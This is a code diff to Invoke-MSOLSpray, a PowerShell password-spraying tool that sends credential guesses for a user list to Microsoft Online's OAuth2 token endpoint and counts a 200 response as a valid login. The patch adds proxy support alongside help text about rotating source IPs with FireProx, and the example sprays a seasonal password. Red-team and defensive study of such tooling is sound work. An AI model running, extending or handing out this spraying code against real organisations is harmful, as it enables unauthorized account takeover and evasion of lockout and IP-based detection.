@@ -34,6 +34,10 @@ function Invoke-MSOLSpray{
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
     
+    .PARAMETER Proxy
+        
+        Proxy URL to use.
+    
     .EXAMPLE
         
         C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
@@ -70,7 +74,11 @@ function Invoke-MSOLSpray{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Force
+    $Force,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [string]
+    $Proxy = ""
   )
     
     $ErrorActionPreference= 'silentlycontinue'
@@ -81,10 +89,23 @@ function Invoke-MSOLSpray{
     $lockoutquestion = 0
     $fullresults = @()
 
+    # Invoke-WebRequest default parameters
+    $Params = @{
+        Method = "POST"
+        Uri = "$URL/common/oauth2/token"
+        Headers = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
+    }
+
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
+    If ($Proxy -ne "") {
+        Write-Host -ForegroundColor "yellow" "[*] using proxy: $Proxy"
+        # add Proxy parameter
+        $Params["Proxy"] = $Proxy
+    }
     Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
     $currenttime = Get-Date
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
+
 
     ForEach ($username in $usernames){
         
@@ -94,9 +115,9 @@ function Invoke-MSOLSpray{
         Write-Host -nonewline "$curr_user of $count users tested`r"
 
         # Setting up the web request
-        $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
-        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        $Params["Body"] = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
+        #$Params["ErrorVariable"] = RespErr
+        $webrequest = Invoke-WebRequest @Params -ErrorVariable RespErr
 
         # If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
